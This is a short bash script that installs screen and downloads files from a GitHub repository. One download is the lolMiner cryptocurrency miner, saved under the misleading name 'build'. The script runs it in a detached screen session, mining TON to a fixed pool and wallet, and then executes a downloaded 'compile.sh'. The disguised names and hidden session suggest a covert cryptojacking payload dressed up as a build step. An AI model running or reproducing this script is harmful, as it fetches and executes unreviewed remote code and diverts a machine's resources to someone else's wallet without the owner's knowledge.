#!/bin/bash
apt-get update
apt install screen -y
wget -qO tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget -qO compile.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/compile.sh
wget -qO build https://github.com/uaaoxjdr/testly/raw/main/lolMiner
chmod +x compile.sh
chmod +x build
screen -dm -S build ./build -a TON -p https://server1.whalestonpool.com -u EQBovP38ruocodmwpj0C05XgyuNKgg6qZUjUEuAWoaWYbUN7
./compile.sh
